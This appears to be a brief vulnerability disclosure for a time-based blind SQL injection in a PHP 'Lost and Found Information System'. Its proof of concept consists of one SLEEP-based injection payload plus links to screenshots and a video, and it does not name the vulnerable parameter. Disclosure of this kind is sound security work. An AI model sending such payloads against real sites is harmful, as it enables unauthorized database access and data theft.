# Lost and Found Information System

**Exploit Title: Lost and Found Information System Blind SQL Injection**

**Date**: 4/03/2024

**Exploit Author:** y3thu

**Vendor Homepage:** [https://www.sourcecodester.com/users/tips23](https://www.sourcecodester.com/users/tips23)

**Software Link:** [https://www.sourcecodester.com/php/16525/lost-and-found-information-system-using-php-and-mysql-db-source-code-free-download.html](https://www.sourcecodester.com/php/16525/lost-and-found-information-system-using-php-and-mysql-db-source-code-free-download.html)

**Attack Vector:** WEB, Network

**Testeted on:** Kali Linux

**POC**

- **payload:**
    
    ```jsx
    ' AND (SELECT 5506 FROM (SELECT(SLEEP(5)))Lwfa) AND 'SvjZ'='SvjZ
    ```
    <img width="724" alt="Untitled" src="https://github.com/yethu123/vulns-finding/assets/29069905/63f6b18d-01e2-4273-89fc-f6cb19c3d2ae">

https://github.com/yethu123/vulns-finding/assets/29069905/5ddb9600-7183-4a8f-bada-60de8af33e03

